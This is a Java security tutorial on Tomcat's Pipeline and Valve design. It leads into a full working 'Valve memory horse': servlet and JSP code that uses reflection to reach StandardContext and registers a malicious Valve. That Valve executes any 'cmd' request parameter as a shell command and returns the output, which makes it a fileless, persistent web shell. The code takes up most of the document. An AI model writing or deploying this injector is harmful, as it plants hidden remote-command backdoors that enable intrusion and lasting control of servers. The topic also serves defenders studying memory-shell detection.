# Java Security Of Tomcat Valve

## Preparation

​ When I learned about the `Listener` memory horse, the `Filter` memory horse and the `Servlet` memory horse, there is always a common word `Valve` in the call stack at the breakpoint. The invoke method of many methods related to `Valve` is called invoke in the call chain.

![](img/1.png)

`Valve` translates as valve. In `Tomcat`, there is a pipeline (`PipeLine`) and several valves (`Valve`) in the four major container classes `StandardEngine`, `StandardHost`, `StandardContext`, and `StandardWrapper`.

​ `PipeLine` is automatically generated when the container class object is generated, just like the container's logical bus, loading each `Valve` in sequence, and `Valve` is a specific implementation of logic, and calls between each `Valve` are completed through `PipeLine`. When the `PipeLine` is generated, a default `Valve` implementation is generated, which is the `StandardEngineValve`, `StandardHostValve`, `StandardContextValve`, and `StandardWrapperValve` that are often seen in debugging.

​ `Tomcat` uses a chain of responsibilities to implement the processing of client requests in order to achieve the scalability and scalability of each component of the overall architecture. Two interfaces are defined in `Tomcat`: Pipeline` and `Valve`. There is a most basic `Valve` in `Pipeline`, which is always at the end, executed at the end, and encapsulates the specific request processing and output response process. `Pipeline` provides the `addValve` method, which can add a new `Valve` before `BasicValve` and execute it in the order of addition.

![](img/2.png)

​ The four subcontainers of the Tomcat container have basic `Valve` implementations (`StandardEngineValve`, `StandardHostValve`, `StandardContextValve`, `StandardWrapperValve`), which also maintain a `Pipeline` instance (`StandardPipeline`). That is, the request processing can be extended on any level of containers, and the basic implementations of these four `Valve` inherit `ValveBase`.

## Process Analysis

Follow up on the `org.apache.catalina.connector.CoyoteAdapter#service` method in the stack diagram at the beginning of the above call the `org.apache.catalina.connector.CoyoteAdapter#service` method calls the `StandardEngine#getPipline` method to obtain its `Pipeline`, then get the first `Valve` in the `Pipeline` and call the `Valve` invoke` method.

![](img/3.png)

​ Follow up on the invoke method and found that it calls the `org.apache.catalina.core.StandardEngineValve#invoke` method. `StandardEngineValve` inherits `ValveBase`, and you can get `request` and `response` in the `invoke` method.

![](img/4.png)

## Achievement

### Idea

​ The specific ideas for dynamically injecting `Valve` memory horse are as follows:

1. Inherit and construct a malicious `Valve`;
2. Get `StandardContext`;
3. Get the `StandardPipeline` of the current container through `StandardContext`;
4. Call the `StandardContext#addValve` method to add malicious `Valve`.

### Dynamic Registration

#### Servlet

```java
package servlet;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

@WebServlet(name = "ValveMemoryShellServlet", value = "/ValveMemoryShellServlet")
public class ValveMemoryShellServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        super.doGet(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
        try {
            ServletContext servletContext = request.getSession().getServletContext();
            Field context = servletContext.getClass().getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);
            Field context1 = applicationContext.getClass().getDeclaredField("context");
            context1.setAccessible(true);
            StandardContext standardContext = (StandardContext) context1.get(applicationContext);

            ValveBase valveBase = new ValveBase() {
                @Override
                public void invoke(Request request, Response response) throws IOException {
                    if ((((HttpServletRequest) request).getParameter("cmd") != null) {
                        boolean isLinux = true;
                        String osType = System.getProperty("os.name");
                        if (osType != null && osType.toLowerCase().contains("win")) {
                            isLinux = false;
                        }

                        String[] command = isLinux ? new String[]{"sh", "-c", ((HttpServletRequest) request).getParameter("cmd")} : new String[]{"cmd.exe", "/c", ((HttpServletRequest) request).getParameter("cmd")};
InputStream inputStream = Runtime.getRuntime().exec(command).getInputStream();
                        Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                        String output = scanner.hasNext() ? scanner.next() : "";
                        ((HttpServletResponse) response).getWriter().write(output);
                        ((HttpServletResponse) response).getWriter().flush();
                    }
                }
            };

            standardContext.getPipeline().addValve(valveBase);
            response.getWriter().write("Valve Inject Successfully...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![](img/5.png)

### JSP

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="java.io.IOException" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field context = servletContext.getClass().getDeclaredField("context");
    context.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);
    Field context1 = applicationContext.getClass().getDeclaredField("context");
    context1.setAccessible(true);
    StandardContext standardContext = (StandardContext) context1.get(applicationContext);

    ValveBase valveBase = new ValveBase() {
        @Override
        public void invoke(Request request, Response response) throws IOException {
            if ((((HttpServletRequest) request).getParameter("cmd") != null) {
                boolean isLinux = true;
                String osType = System.getProperty("os.name");
                if (osType != null && osType.toLowerCase().contains("win")) {
                    isLinux = false;
                }

                String[] command = isLinux ? new String[]{"sh", "-c", ((HttpServletRequest) request).getParameter("cmd")} : new String[]{"cmd.exe", "/c", ((HttpServletRequest) request).getParameter("cmd")};
                InputStream inputStream = Runtime.getRuntime().exec(command).getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                String output = scanner.hasNext() ? scanner.next() : "";
                ((HttpServletResponse) response).getWriter().write(output);
                ((HttpServletResponse) response).getWriter().flush();
            }
        }
    };

    standardContext.getPipeline().addValve(valveBase);
    response.getWriter().write("Valve Inject Successfully...");
%>
```

![](img/6.png)